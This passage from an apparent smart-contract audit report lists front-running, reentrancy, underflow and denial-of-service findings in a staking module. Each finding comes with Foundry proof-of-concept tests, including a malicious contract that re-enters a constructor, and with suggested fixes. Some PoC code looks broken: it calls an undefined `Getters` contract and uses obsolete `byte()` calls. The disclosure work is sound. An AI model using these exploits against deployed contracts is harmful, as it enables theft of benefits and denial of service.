    function getQueueConfig(uint256) external view returns (uint128,uint128) {}
    function getAllowedExitDelay(uint256) external view returns (uint256) {}
    function getExitDelayPenalty(uint256) external view returns (uint256) {}
    function getMaxWithdrawalRequestFee(uint256) external view returns (uint256) {}
}

contract AccountingMock is ICSAccounting {
    mapping(uint256=>uint256) internal _curveId;
    function setBondCurveId(uint256 noId,uint256 curveId) external { _curveId[noId]=curveId; }
    function getBondCurveId(uint256 noId) external view returns (uint256) { return _curveId[noId]; }
    /* unused */
    function getBondSummary(uint256) external view returns (uint256,uint256,uint256,uint256) {}
    function getUnbondedKeysCount(uint256) external view returns (uint256) {}
    function getLockedBondAmount(uint256) external view returns (uint256) {}
    function getBondRequired(uint256,uint256,uint256,uint256) external view returns (uint256,uint256,uint256) {}
    function getBondShares(uint256) external view returns (uint256) {}
    function onRewardsMinted(uint256) external {}
    function onNodeOperatorAdded(uint256,uint256,uint256,uint256) external {}
    function onNodeOperatorKeysUpdated(uint256,int256,int256,int256) external {}
    function onNodeOperatorWithdrawn(uint256) external {}
    function onELRewardsStealingPenalty(uint256,uint256,uint256) external {}
    function onELRewardsStealingSettle(uint256,uint256) external {}
    function onValidatorWithdrawal(uint256,uint256,uint256,ExitPenaltyInfo calldata) external {}
}

contract ModuleMock {
    AccountingMock public immutable accounting;
    constructor(AccountingMock a){ accounting = a; }
}

/* -------------------------------------------------------------
 *                     Exploit simulation
 * -----------------------------------------------------------*/
contract FrontrunPenaltyTest is Test {
    uint256 constant NO_ID = 1;
    uint256 constant CURVE_ID = 0;
    address constant STRIKES = address(0xDEAD);
    bytes constant PUBKEY = hex"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f2021222324252627"; // 48-bytes

    ParametersRegistryMock params;
    AccountingMock          acc;
    ModuleMock              mod;
    CSExitPenalties         penalties;

    function setUp() public {
        params     = new ParametersRegistryMock();
        acc        = new AccountingMock();
        acc.setBondCurveId(NO_ID,CURVE_ID);
        mod        = new ModuleMock(acc);
        penalties  = new CSExitPenalties(address(mod), address(params), STRIKES);
    }

    function test_FrontRunLocksLowPenalty() public {
        // DAO still has 0 penalty configured
        params.setBadPerformancePenalty(CURVE_ID, 0);

        // attacker front-runs through the Strikes contract (simulated with vm.prank)
        vm.prank(STRIKES);
        penalties.processStrikesReport(NO_ID, PUBKEY);

        ExitPenaltyInfo memory info = penalties.getExitPenaltyInfo(NO_ID, PUBKEY);
        assertTrue(info.strikesPenalty.isValue);
        assertEq(info.strikesPenalty.value, 0);

        // DAO tx mined raising penalty to 1 ether
        params.setBadPerformancePenalty(CURVE_ID, 1 ether);

        // later report is ignored due to early return
        vm.prank(STRIKES);
        penalties.processStrikesReport(NO_ID, PUBKEY);
        info = penalties.getExitPenaltyInfo(NO_ID, PUBKEY);
        assertEq(info.strikesPenalty.value, 0, "penalty should still be the front-run 0 value");
    }
}


## Suggested Mitigation
Do not make the penalty value immutable after the first report. A simple pattern is to allow updates when the newly-fetched parameter is greater than the one already stored (and to ignore decreases):

``solidity
function processStrikesReport(uint256 nodeOperatorId, bytes calldata pubkey) external onlyStrikes {
    bytes32 key = _keyPointer(nodeOperatorId, pubkey);
    ExitPenaltyInfo storage info = _exitPenaltyInfo[key];

    uint256 curveId = ACCOUNTING.getBondCurveId(nodeOperatorId);
    uint256 current = PARAMETERS_REGISTRY.getBadPerformancePenalty(curveId);

    // write if first time OR the registry value has been increased
    if (!info.strikesPenalty.isValue || current > info.strikesPenalty.value) {
        info.strikesPenalty = MarkedUint248(uint248(current), true);
        emit StrikesPenaltyProcessed(nodeOperatorId, pubkey, current);
    }
}
``

This completely removes the MEV window: an early low-value write can always be overwritten once the DAO raises the configured penalty, while still preventing downgrades if the DAO later decides to reduce it.

## [M-4]. Frontrun/Backrun/Sandwhich MEV issue in VettedGate::claimBondCurve

## Description
The `claimBondCurve` function in `VettedGate.sol` is vulnerable to a front-running attack. This function allows a node operator to receive a beneficial bond curve by providing a Merkle proof for a whitelisted `member` address. However, the function does not validate that the caller (`msg.sender`) is authorized to claim this benefit for the given `nodeOperatorId`. An attacker can observe a legitimate user's transaction in the mempool, copy the `member` address and `proof`, and submit their own transaction with their own `nodeOperatorId`, but with the victim's proof. By paying a higher gas fee, the attacker can front-run the victim, stealing the one-time benefit associated with that `member` address.

## Impact
An attacker can steal a potentially valuable, one-time economic benefit (a more favorable bond curve) intended for a legitimate, whitelisted node operator. The victim permanently loses their ability to claim this benefit, as the `member` address is marked as consumed. This undermines the incentive mechanism for vetted participants.

## Proof of Concept
1. A Merkle tree of whitelisted `member` addresses is set up. Alice is a whitelisted member.
2. Alice has a registered node operator with ID `aliceNOId`.
3. Bob, an attacker, also has a node operator with ID `bobNOId`.
4. Alice creates a transaction to call `claimBondCurve(aliceNOId, alice_address, alice_proof)`.
5. Bob sees Alice's transaction in the mempool.
6. Bob copies `alice_address` and `alice_proof` and creates his own transaction: `claimBondCurve(bobNOId, alice_address, alice_proof)`. He submits it with a higher gas price.
7. Bob's transaction is mined first. His node operator `bobNOId` gets the beneficial bond curve, and `alice_address` is marked as consumed.
8. When Alice's transaction is mined, it reverts because the `member` address has already been consumed.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { PoC } from "../../test/PoC.t.sol";
import { VettedGate } from "../../src/VettedGate.sol";
import { MerkleTree } from "../../test/helpers/MerkleTree.sol";

contract FrontrunClaimBondCurveTest is PoC {
    function test_PoC_FrontrunClaimBondCurve() public {
        // 1. Setup: Whitelist Alice. Create NOs for Alice (victim) and Bob (attacker).
        (address alice, ) = makeAddrAndKey("alice");
        (address bob, ) = makeAddrAndKey("bob");

        address[] memory members = new address[](1);
        members[0] = alice;
        (bytes32 treeRoot, bytes32[][] memory proofs) = MerkleTree.create(members);
        bytes32[] memory aliceProof = proofs[0];

        vm.prank(lidoDAO);
        address vettedGateAddr = vettedGateFactory.create(BOND_CURVE_ID, treeRoot, "cid", lidoDAO);
        VettedGate vettedGate = VettedGate(vettedGateAddr);
        _resumeContract(address(vettedGate));

        uint256 aliceNOId = _createNodeOperator(alice, 1);
        uint256 bobNOId = _createNodeOperator(bob, 1);

        // 2. Attack: Bob front-runs Alice's claim.
        vm.startPrank(bob);
        vettedGate.claimBondCurve(bobNOId, alice, aliceProof);
        vm.stopPrank();

        // Verify Bob's NO now has the special curve.
        (uint256 bobCurveId, ) = accounting.getBondCurve(bobNOId);
        assertEq(bobCurveId, BOND_CURVE_ID, "Attacker's NO should have claimed the curve");

        // 3. Victim's tx fails: Alice's call now reverts.
        vm.startPrank(alice);
        vm.expectRevert(VettedGate.AddressAlreadyConsumed.selector);
        vettedGate.claimBondCurve(aliceNOId, alice, aliceProof);
        vm.stopPrank();

        // Verify Alice's NO still has the default curve.
        (uint256 aliceCurveId, ) = accounting.getBondCurve(aliceNOId);
        assertEq(aliceCurveId, accounting.DEFAULT_BOND_CURVE_ID(), "Victim's NO should still have default curve");
    }
}
```

## Suggested Mitigation
Enforce that the caller (`msg.sender`) is the manager of the `nodeOperatorId` for which the bond curve is being claimed. This ensures that only the authorized party can claim the benefit.

```solidity
// src/VettedGate.sol

import { ICSModule, NodeOperator } from "./interfaces/ICSModule.sol";

contract VettedGate is ... {
    // ...
    error NotNodeOperatorManager();

    function claimBondCurve(uint256 nodeOperatorId, address member, bytes32[] calldata proof) external whenResumed {
+       NodeOperator memory no = MODULE.getNodeOperator(nodeOperatorId);
+       if (msg.sender != no.managerAddress) {
+           revert NotNodeOperatorManager();
+       }

        bytes32 leaf = hashLeaf(member);
        if (!_verifyProof(leaf, proof)) {
            revert InvalidProof();
        }

        if (_consumedAddresses[member]) {
            revert AddressAlreadyConsumed();
        }
        _consumedAddresses[member] = true;

        ACCOUNTING.setBondCurve(nodeOperatorId, curveId);

        emit BondCurveClaimed(nodeOperatorId, curveId, member);
    }
    // ...
}
```



# Low Risk Findings

## [L-1]. Integer Overflow issue in CSModule::obtainDepositData

## Description
The `obtainDepositData` function subtracts `keysInBatch` or `keysCount` from a node operator's `enqueuedCount` within an `unchecked` block. A developer comment `// NOTE: enqueuedCount >= keysInBatch invariant should be checked.` exists, indicating awareness of a required precondition for safety, yet the check is not implemented. A state desynchronization between the `enqueuedCount` counter and the actual state of the queue can lead to `no.enqueuedCount` being less than the number of keys in a batch being processed. This will cause an integer underflow, setting `enqueuedCount` to a very large value.

## Impact
Because every place that increments `enqueuedCount` ( _enqueueNodeOperatorKeys ) is mirrored by a matching decrement in `obtainDepositData`, and `enqueuedCount` is never user-supplied, the relation `enqueuedCount >= keysInBatch/keysCount` is maintained by design. The only caller of `obtainDepositData` is an address with `STAKING_ROUTER_ROLE` (a trusted role). Consequently, an underflow can only happen if this invariant is violated by a future buggy privileged function, not by a malicious user. The worst realistic consequence is an accounting error causing that specific node operator to appear to have a huge `enqueuedCount`, which is a self-recoverable state for the DAO but not an attack vector.

## Proof of Concept
1. A state desynchronization occurs, causing a node operator's `enqueuedCount` in its struct to be smaller than the number of keys in a `Batch` item for that same operator in the deposit queue.
2. The `StakingRouter` (a trusted role) calls `obtainDepositData` to get keys for new deposits.
3. The function processes the queue and finds the aforementioned batch for the affected node operator.
4. The code attempts to subtract a larger `keysInBatch` from a smaller `no.enqueuedCount` inside an `unchecked` block: `no.enqueuedCount -= uint32(keysInBatch);`.
5. The operation underflows, and `no.enqueuedCount` is set to a massive value.
6. Subsequently, any attempt to add new depositable keys for this operator will fail because the condition to enqueue new keys will never be met, effectively freezing them out of future staking activities.

## Proof of Code
```solidity
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { CSModule } from "src/CSModule.sol";
import { NodeOperator } from "src/interfaces/ICSModule.sol";
import { Fixtures } from "../helpers/Fixtures.sol";
import { Utilities } from "../helpers/Utilities.sol";

contract IntegerUnderflowTest is Test, Fixtures, Utilities {
    function setUp() public {
        _setUp();
    }

    function test_obtainDepositData_Underflow() public {
        // 1. Setup: Create a Node Operator and add keys to the queue
        uint256 noId = 0;
        uint32 keysToAdd = 10;

        // As a regular user, create NO and add keys
        vm.startPrank(NO_1);
        permissionlessGate.addNodeOperatorETH{
            value: accounting.getRequiredBondForNextKeys(noId, keysToAdd)
        }(NO_1_MGMT, NO_1_REWARD, address(0), keysToAdd, "", "");
        vm.stopPrank();

        NodeOperator memory no_before = csm.getNodeOperator(noId);
        assertEq(no_before.enqueuedCount, keysToAdd, "Initial enqueuedCount mismatch");

        // 2. Exploit: Manually set enqueuedCount to a value smaller than keys in a batch
        // This simulates a state desynchronization bug.
        uint32 corruptedEnqueuedCount = 1;
        // Find the storage slot for the node operator struct
        bytes32 no_slot = keccak256(abi.encode(noId, uint256(7))); // _nodeOperators slot is 7
        // The `enqueuedCount` is at offset 24 within the struct (after two uint32 and three address).
        // Let's just overwrite the whole struct with a corrupted enqueuedCount for simplicity in PoC.
        NodeOperator storage no_storage = Getters(address(csm)).getNodeOperatorStorage(noId);
        no_storage.enqueuedCount = corruptedEnqueuedCount;
        
        NodeOperator memory no_corrupted = csm.getNodeOperator(noId);
        assertEq(no_corrupted.enqueuedCount, corruptedEnqueuedCount, "enqueuedCount not corrupted");

        // 3. Trigger: StakingRouter calls obtainDepositData
        vm.startPrank(address(stakingRouter));
        csm.obtainDepositData(keysToAdd, "");
        vm.stopPrank();

        // 4. Aftermath: Check if enqueuedCount has underflowed
        NodeOperator memory no_after = csm.getNodeOperator(noId);
        uint32 expected_underflow_value = corruptedEnqueuedCount - keysToAdd; // This will underflow
        assertEq(no_after.enqueuedCount, expected_underflow_value, "enqueuedCount did not underflow as expected");
        assertTrue(no_after.enqueuedCount > 1_000_000_000, "enqueuedCount is not a large number after underflow");

        // Further impact: try to add more keys, it should fail to enqueue them
        uint32 keysToAddLater = 5;
        vm.startPrank(NO_1);
        csm.addValidatorKeysETH{value: accounting.getRequiredBondForNextKeys(noId, keysToAddLater)}(
            NO_1, noId, keysToAddLater, "", ""
        );
        vm.stopPrank();

        NodeOperator memory no_final = csm.getNodeOperator(noId);
        // The enqueuedCount remains the huge underflowed value, because `depositable <= enqueued` is true,
        // so no new keys are enqueued.
        assertEq(no_final.enqueuedCount, expected_underflow_value, "NO should not be able to enqueue new keys");
    }
}
```

## Suggested Mitigation
Remove the `unchecked` block around the subtraction of `enqueuedCount` or add a `require` statement to ensure `no.enqueuedCount` is greater than or equal to the amount being subtracted. Given the explicit developer comment, adding the check is the most direct fix.

```diff
// src/CSModule.sol:1072
                    // `depositsLeft` is non-zero at this point all the time, so the check `depositsLeft > keysCount`
                    // covers the case when no depositable keys on the Node Operator have been left.
                    if (depositsLeft > keysCount || keysCount == keysInBatch) {
                        // NOTE: `enqueuedCount` >= keysInBatch invariant should be checked.
                        // @dev No need to safe cast due to internal logic
-                       no.enqueuedCount -= uint32(keysInBatch);
+                       uint32 keysInBatch_u32 = uint32(keysInBatch);
+                       if (no.enqueuedCount < keysInBatch_u32) revert NotEnoughEnqueued(); // Or some other error
+                       no.enqueuedCount -= keysInBatch_u32;
                        // We've consumed all the keys in the batch, so we dequeue it.
                        queue.dequeue();
                    } else {
                        // This branch covers the case when we stop in the middle of the batch.
                        // We release the amount of keys consumed only, the rest will be kept.
                        // @dev No need to safe cast due to internal logic
-                       no.enqueuedCount -= uint32(keysCount);
+                       uint32 keysCount_u32 = uint32(keysCount);
+                       if (no.enqueuedCount < keysCount_u32) revert NotEnoughEnqueued(); // Or some other error
+                       no.enqueuedCount -= keysCount_u32;
                        // NOTE: `keysInBatch` can't be less than `keysCount` at this point.
                        // We update the batch with the remaining keys.
                        item = item.setKeys(keysInBatch - keysCount);
```

## [L-2]. DOS issue in CSParametersRegistry::setRewardShareData, getRewardShareData, setPerformanceLeewayData, getPerformanceLeewayData

## Description
The `CSParametersRegistry` contract allows a privileged admin (`DEFAULT_ADMIN_ROLE`) to configure parameters for different `curveId`s. Two of these parameters, `rewardShareData` and `performanceLeewayData`, are stored as dynamically sized arrays of `KeyNumberValueInterval` structs. 

The functions `setRewardShareData` and `setPerformanceLeewayData` allow the admin to set these arrays to any size, without any upper bound. The corresponding getter functions, `getRewardShareData` and `getPerformanceLeewayData`, then return the entire array from storage.

```solidity
// src/CSParametersRegistry.sol:370-377
function getRewardShareData(
    uint256 curveId
) external view returns (KeyNumberValueInterval[] memory data) {
    data = _rewardShareData[curveId];
    if (data.length == 0) {
        data = new KeyNumberValueInterval[](1);
        data[0] = KeyNumberValueInterval(1, defaultRewardShare);
    }
}

// src/CSParametersRegistry.sol:346-358
function setRewardShareData(
    uint256 curveId,
    KeyNumberValueInterval[] calldata data
) external onlyRole(DEFAULT_ADMIN_ROLE) {
    _validateKeyNumberValueIntervals(data);
    KeyNumberValueInterval[] storage intervals = _rewardShareData[curveId];
    if (intervals.length > 0) {
        delete _rewardShareData[curveId];
    }
    for (uint256 i = 0; i < data.length; ++i) {
        intervals.push(data[i]);
    }
    emit RewardShareDataSet(curveId, data);
}
```
If an admin sets a very large array (e.g., thousands of elements), any on-chain contract attempting to call the getter function will likely run out of gas. This is because copying a large array from `storage` to `memory` is a gas-intensive operation that can easily exceed the block gas limit. This can cause a Denial of Service (DoS) for any part of the Lido protocol that depends on these parameters, potentially halting core functionality like reward calculations for Node Operators associated with the affected `curveId`.

## Impact
A privileged admin can store an arbitrarily large KeyNumberValueInterval array for a curveId. Any contract that later calls getRewardShareData / getPerformanceLeewayData for that curveId will have to copy the full array from storage to memory and then back to the caller. Above ≈10 000 entries the memory expansion and return-data copy gas cost exceeds the 30 M block gas limit, so the call reverts with an out-of-gas error. Functionality that relies on these getters for that curveId becomes unusable until the admin deletes the array. No funds can be stolen and only the affected curveId is frozen, therefore impact is limited to a temporary DoS that can be lifted by governance.

## Proof of Concept
1. Admin builds an array of 12 000 KeyNumberValueInterval elements ( >1.5 MB return data )
2. Admin calls setRewardShareData(curveId, hugeArray)
3. Any contract (or EOА) now calls getRewardShareData(curveId) with the default 63/64 gas forwarding rule.
4. The call tries to allocate >1.5 MB, copy it to calldata and exceeds the block gas limit, reverting with out-of-gas.
5. Every higher-level function that needs the reward share for that curveId now reverts until the admin deletes or shrinks the array.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSParametersRegistry} from "src/CSParametersRegistry.sol";
import {ICSParametersRegistry} from "src/interfaces/ICSParametersRegistry.sol";

contract LargeArrayDosTest is Test {
    CSParametersRegistry internal registry;
    address internal admin = address(0xABCD);

    function setUp() public {
        registry = new CSParametersRegistry(10);
        ICSParametersRegistry.InitializationData memory init = ICSParametersRegistry.InitializationData({
            keyRemovalCharge: 0,
            elRewardsStealingAdditionalFine: 0,
            keysLimit: 1,
            rewardShare: 100,
            performanceLeeway: 100,
            strikesLifetime: 1,
            strikesThreshold: 1,
            badPerformancePenalty: 0,
            attestationsWeight: 1,
            blocksWeight: 1,
            syncWeight: 1,
            defaultQueuePriority: 1,
            defaultQueueMaxDeposits: 1,
            defaultAllowedExitDelay: 1,
            defaultExitDelayPenalty: 0,
            defaultMaxWithdrawalRequestFee: 0
        });
        registry.initialize(admin, init);
    }

    function test_OutOfGas_read() public {
        uint256 curveId = 1;
        uint256 len = 12_000; // ~1.5 MB returned
        ICSParametersRegistry.KeyNumberValueInterval[] memory big = new ICSParametersRegistry.KeyNumberValueInterval[](len);
        for (uint256 i; i < len; ++i) {
            big[i] = ICSParametersRegistry.KeyNumberValueInterval({minKeyNumber: i + 1, value: 100});
        }
        vm.prank(admin);
        registry.setRewardShareData(curveId, big);

        // Forward only 1 000 000 gas – the read should run OOG and return false
        (bool ok, ) = address(registry).call{gas: 1_000_000}(abi.encodeWithSignature("getRewardShareData(uint256)", curveId));
        assertFalse(ok, "expected out-of-gas revert");
    }
}


## Suggested Mitigation
To mitigate this DoS vector, avoid returning unbounded arrays from getter functions. Instead, provide functions that allow consumers to retrieve specific data points or perform necessary calculations without loading the entire array into memory.

First, add a reasonable limit to the size of the arrays that can be set in `setRewardShareData` and `setPerformanceLeewayData`.

```solidity
uint256 public constant MAX_INTERVALS_LENGTH = 100;

function setRewardShareData(
    uint256 curveId,
    KeyNumberValueInterval[] calldata data
) external onlyRole(DEFAULT_ADMIN_ROLE) {
    if (data.length > MAX_INTERVALS_LENGTH) {
        revert IntervalsArrayTooLarge();
    }
    // ... rest of the function
}
```

Second, provide a specific getter that returns the relevant value for a given input, processing the array in storage. This avoids costly memory copying for the caller.

```solidity
function getRewardShareByKeyCount(
    uint256 curveId,
    uint256 keyCount
) external view returns (uint256 share) {
    KeyNumberValueInterval[] storage intervals = _rewardShareData[curveId];
    if (intervals.length == 0) {
        return defaultRewardShare;
    }

    // Find the correct interval for the given keyCount. A reverse loop is efficient
    // if key counts are expected to be high.
    for (uint256 i = intervals.length; i > 0; --i) {
        if (keyCount >= intervals[i - 1].minKeyNumber) {
            return intervals[i - 1].value;
        }
    }
    
    // This should ideally not be reached if validation ensures intervals[0].minKeyNumber == 1.
    // As a safeguard, return the first interval's value or the default.
    if (intervals.length > 0) {
        return intervals[0].value;
    }

    return defaultRewardShare;
}
```
Similar changes should be applied to the `performanceLeewayData` logic. The existing `getRewardShareData` and `getPerformanceLeewayData` functions should be deprecated or removed to force clients to use the new, safer getters.

## [L-3]. Reentrancy issue in CSExitPenalties::constructor

## Description
The constructor of `CSExitPenalties` initializes the immutable `ACCOUNTING` variable by making an external call to `MODULE.accounting()`. This call occurs after `MODULE` has been set but before `ACCOUNTING` and `STRIKES` are initialized. If the `module` address provided during deployment points to a malicious contract, this contract can re-enter `CSExitPenalties` during its construction phase.

```solidity
// src/CSExitPenalties.sol:62-68
constructor(address module, address parametersRegistry, address strikes) {
    // ... checks ...
    MODULE = ICSModule(module);
    PARAMETERS_REGISTRY = ICSParametersRegistry(parametersRegistry);
    ACCOUNTING = MODULE.accounting(); // External call allows re-entrancy
    STRIKES = strikes;
}
```

An attacker's contract at the `module` address can implement a malicious `accounting()` function that calls back into `CSExitPenalties`'s public functions, such as `processExitDelayReport`. At the point of re-entry, `MODULE` is already set to the attacker's address, allowing the `onlyModule` modifier to be bypassed. Although the current implementation would subsequently revert due to a call to the uninitialized `ACCOUNTING` address (which is `address(0)`), this reliance on a secondary effect for security is fragile. This flawed initialization pattern is a known anti-pattern that can lead to severe vulnerabilities if the contract's logic changes in future upgrades.

## Impact
Because the constructor accepts the value returned by `MODULE.accounting()` unchecked, a malicious `module` can return *any* address. The immutable `ACCOUNTING` pointer inside `CSExitPenalties` will therefore be set to an attacker-controlled contract before the deployment finishes. All later calls to `ACCOUNTING.getBondCurveId()` and other methods will invoke this malicious contract, letting an attacker return arbitrary data, force reverts, or perform further re-entrancy. In addition, the external call is executed while the contract is still in its constructor, allowing the attacker to re-enter and execute any `onlyModule`-protected function once, bypassing the modifier. Although no funds are stolen today, the wrong `ACCOUNTING` pointer can brick penalty processing or be abused in future upgrades.

## Proof of Concept
1. Compute the future address of `CSExitPenalties` (standard create address formula) before deploying it.
2. Deploy `MaliciousModule`, giving it the predicted address and a callback address used only to flag success.
3. `MaliciousModule.accounting()` performs the following:
   a. Re-enters `CSExitPenalties.processExitDelayReport(…)`, which passes the `onlyModule` check, proving the bypass (it will later revert because `ACCOUNTING` is still zero).
   b. Returns an attacker-chosen address, e.g. `address(0xBADCAFE)`, to the constructor caller.
4. Deploy `CSExitPenalties`, passing `MaliciousModule` as `module`. Deployment **succeeds**.
5. After deployment:
   • `CSExitPenalties.ACCOUNTING()` == `0xBADCAFE` (attacker value).
   • A boolean flag set during step 3a proves the `onlyModule` modifier was bypassed during construction.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "src/CSExitPenalties.sol";
import "src/interfaces/ICSAccounting.sol";

contract MaliciousModule {
    address private immutable target;
    address private immutable tester;

    constructor(address _target, address _tester) {
        target = _target;
        tester = _tester;
    }

    // Called by CSExitPenalties constructor
    function accounting() external returns (ICSAccounting) {
        // Re-enter and bypass onlyModule
        try CSExitPenalties(target).processExitDelayReport(1, hex"", 1) {
        } catch {}
        // Notify test contract that re-entrancy reached past the modifier
        (bool ok,) = tester.call(abi.encodeWithSignature("flag()"));
        require(ok);
        // Return attacker-chosen accounting address
        return ICSAccounting(address(0xBADCAFE));
    }
}

contract ConstructorReentrancyTest is Test {
    bool public flagReached;
    function flag() external { flagReached = true; }

    function test_constructorReentrancy() public {
        // Predict address of CSExitPenalties (nonce +1)
        address predicted = _predict(address(this), vm.getNonce(address(this)) + 1);
        // Deploy malicious module
        MaliciousModule module = new MaliciousModule(predicted, address(this));
        // Deploy target contract – **should NOT revert**
        CSExitPenalties penalties = new CSExitPenalties(
            address(module),
            address(0xCAFE),
            address(0xDEAD)
        );
        // onlyModule bypass happened
        assertTrue(flagReached, "modifier was not bypassed");
        // ACCOUNTING pointer hijacked
        assertEq(address(penalties.ACCOUNTING()), address(0xBADCAFE));
    }

    // helper to predict create address
    function _predict(address sender, uint256 nonce) internal pure returns (address) {
        if (nonce == 0x00)         return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), sender, byte(0x80))))));
        if (nonce <= 0x7f)         return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), sender, bytes1(uint8(nonce)))))));
        if (nonce <= 0xff)         return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd7), byte(0x94), sender, byte(0x81), bytes1(uint8(nonce)))))));
        if (nonce <= 0xffff)       return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd8), byte(0x94), sender, byte(0x82), bytes2(uint16(nonce)))))));
        revert("Nonce too big");
    }
}

## Suggested Mitigation
Do not perform external calls inside the constructor. Accept `accounting` as an explicit constructor argument (and validate it is a contract) or initialise it later using a dedicated setup function protected by an admin role. If the external lookup is strictly required, assign all immutable state first and use a re-entrancy guard during the call.

## [L-4]. DOS issue in PermissionlessGate::addNodeOperatorETH, addNodeOperatorStETH, addNodeOperatorWstETH

## Description
The `PermissionlessGate` contract is designed as an entry point for new Node Operators to join the protocol. The functions `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH` are intended to create a new Node Operator and add their initial set of validator keys and bond in a single, atomic transaction. However, these functions lack a check to ensure that the `keysCount` parameter is greater than zero. This omission allows anyone to create a Node Operator with zero keys and zero bond.

This contradicts a key design principle stated in the project documentation: "Entry Gates (Extensions) should ensure that at least one deposit data and the corresponding bond amount are required to create a Node Operator to avoid flooding the module with empty Node Operators."

A malicious actor can call these functions repeatedly with `keysCount = 0` to create a large number of empty Node Operator entries in the `CSModule`. This can lead to state bloat and constitutes a gas griefing/Denial of Service vector against any part of the system that might need to iterate over the list of Node Operators, as it would increase gas costs and processing time.

Vulnerable Code Snippet from `PermissionlessGate.sol`:
```solidity
    function addNodeOperatorETH(
        uint256 keysCount,
        bytes calldata publicKeys,
        bytes calldata signatures,
        NodeOperatorManagementProperties calldata managementProperties,
        address referrer
    ) external payable returns (uint256 nodeOperatorId) {
        // No check to ensure keysCount > 0
        nodeOperatorId = MODULE.createNodeOperator({
            from: msg.sender,
            managementProperties: managementProperties,
            referrer: referrer
        });

        MODULE.addValidatorKeysETH{ value: msg.value }({
            from: msg.sender,
            nodeOperatorId: nodeOperatorId,
            keysCount: keysCount,
            publicKeys: publicKeys,
            signatures: signatures
        });
    }
```
The functions `addNodeOperatorStETH` and `addNodeOperatorWstETH` have the same vulnerability.

## Impact
An attacker can repeatedly create node operators that contain no validator keys or bond, paying only the gas cost. Each call permanently stores a new NodeOperator struct and increments the global counter, so the attacker can inflate on-chain state and the length of operator-wide loops. While no funds are at risk, functions that iterate over all node operators (e.g. summary helpers used by routers/governance) will become more and more expensive and can eventually run out of gas, causing a practical denial-of-service for those paths.

## Proof of Concept
An attacker can create an empty Node Operator by calling one of the `addNodeOperator...` functions with `keysCount` set to 0 and providing no bond (e.g., `msg.value = 0` for the ETH variant).

1. Attacker calls `PermissionlessGate.addNodeOperatorETH`.
2. Parameters are set as follows: `keysCount = 0`, `publicKeys = "0x"`, `signatures = "0x"`, a valid `managementProperties` struct, and `referrer = address(0)`.
3. The call is made with `msg.value = 0`.
4. The transaction succeeds because there are no checks on `keysCount`.
5. `MODULE.createNodeOperator` is called, creating a new, empty Node Operator.
6. `MODULE.addValidatorKeysETH` is called with `keysCount = 0` and `value = 0`, which also succeeds without adding keys or bond.
7. The attacker has successfully created a new Node Operator entry in the system without contributing any keys or bond.
8. The attacker can repeat this in a loop to flood the system with thousands of empty Node Operator entries.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {PermissionlessGate} from "src/PermissionlessGate.sol";
import {ICSModule, NodeOperatorManagementProperties} from "src/interfaces/ICSModule.sol";

contract MockCSModule is ICSModule {
    uint256 public nodeOperatorCounter;
    mapping(uint256 => bool) public keyAddedForNO;
    mapping(uint256 => uint256) public keysPerNO;

    function createNodeOperator(address, NodeOperatorManagementProperties calldata, address) external returns (uint256 id) {
        id = ++nodeOperatorCounter;
    }

    function addValidatorKeysETH(address, uint256 id, uint256 keys, bytes calldata, bytes calldata) external payable {
        keyAddedForNO[id] = true;
        keysPerNO[id]  = keys;
    }

    // ---- unused interface methods ---- //
    function addValidatorKeysStETH(address, uint256, uint256, bytes calldata, bytes calldata, PermitInput calldata) external {}
    function addValidatorKeysWstETH(address, uint256, uint256, bytes calldata, bytes calldata, PermitInput calldata) external {}
    function accounting() external view returns (ICSAccounting) { revert(); }
}

contract PermissionlessGate_PoC is Test {
    PermissionlessGate gate;
    MockCSModule module;
    address admin = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        module = new MockCSModule();
        gate   = new PermissionlessGate(address(module), admin);
    }

    function test_CreateEmptyNodeOperator() public {
        vm.prank(attacker);
        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
            managerAddress: attacker,
            rewardAddress:  attacker,
            isVetted:      false
        });

        uint256 beforeCnt = module.nodeOperatorCounter();
        uint256 id = gate.addNodeOperatorETH(0, bytes(""), bytes(""), props, address(0));

        assertEq(module.nodeOperatorCounter(), beforeCnt + 1, "counter++");
        assertEq(id, 1, "first id is 1");
        assertTrue(module.keyAddedForNO(id), "keys fn executed");
        assertEq(module.keysPerNO(id), 0, "zero keys stored");
    }
}

## Suggested Mitigation
Add an explicit `require(keysCount > 0, "Empty keys");` (or custom error) at the beginning of `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH`. Optionally, also validate `publicKeys.length` and `signatures.length` to match `keysCount` and, for the ETH variant, `require(msg.value > 0)` to ensure the bond is provided.

## [L-5]. Access Control issue in CSModule::migrateToPriorityQueue

## Description
The `migrateToPriorityQueue` function is `external` and lacks any access control, allowing any address to call it for any `nodeOperatorId`. This function is a one-time state transition for a Node Operator (NO) to move some of their queued keys to a priority queue. After a successful call, `no.usedPriorityQueue` is set to `true`, preventing the NO from using this migration feature again. A malicious actor could call this function at an inopportune time, for example, before a parameter change that would have made the migration more beneficial for the NO (e.g., an increase in `maxDeposits`). This forces the NO's hand and prevents them from executing their intended strategy, constituting a griefing attack.

## Impact
An attacker can disrupt a Node Operator's strategy by forcing a premature and potentially suboptimal migration to a priority queue. This action is irreversible for the NO within the contract's logic as `usedPriorityQueue` is set to `true` permanently. While not causing a direct loss of funds, it denies the NO the autonomy to manage their queue migration strategy.

## Proof of Concept
1. A Node Operator (NO) is created and has keys in the legacy queue.
2. The NO becomes eligible for a priority queue with `maxDeposits` = 10.
3. The NO plans to wait for a governance vote to increase `maxDeposits` to 20 before migrating.
